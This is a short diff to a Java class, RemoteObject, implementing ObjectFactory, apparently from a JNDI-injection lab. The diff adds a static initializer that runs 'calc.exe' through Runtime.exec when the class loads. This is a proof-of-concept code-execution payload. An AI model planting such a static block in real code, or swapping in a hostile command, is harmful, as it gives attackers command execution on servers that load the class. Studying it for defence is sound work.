@@ -7,6 +7,13 @@ import java.io.IOException;
 import java.util.Hashtable;
 
 public class RemoteObject implements ObjectFactory {
+    static {
+        try {
+            Runtime.getRuntime().exec("calc.exe");
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+    }
 
     // 1. 必须提供 public 无参构造函数
     public RemoteObject() {
